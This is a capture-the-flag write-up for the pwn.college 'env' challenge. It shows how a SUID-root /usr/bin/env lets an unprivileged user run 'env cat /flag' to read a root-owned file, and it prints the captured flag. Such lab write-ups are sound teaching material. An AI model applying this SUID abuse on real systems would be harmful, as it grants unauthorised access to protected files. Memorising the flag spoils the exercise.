---
layout: page
title: "Challenge Name: env"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer
**Date**: 2025-07-15  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/env`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/env
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/env
```

-The `s` in `-rws` indicates it's a SUID binary.
-`env` runs with **root privileges**.

## 🚀 Exploitation

The `env` command is used to:

- Run a command in a modified or clean environment.

- Set environment variables temporarily for that command.

- Find executables in your $PATH in a portable way (e.g., #!/usr/bin/env python3 in scripts).

So we can simply cat the /flag using env:

```bash
env cat /flag
```

Output:
```
pwn.college{ETC1sCoTJ7pTOpUVmC6XlNknnz7.dZjNxwSM0IzMyEzW}
```



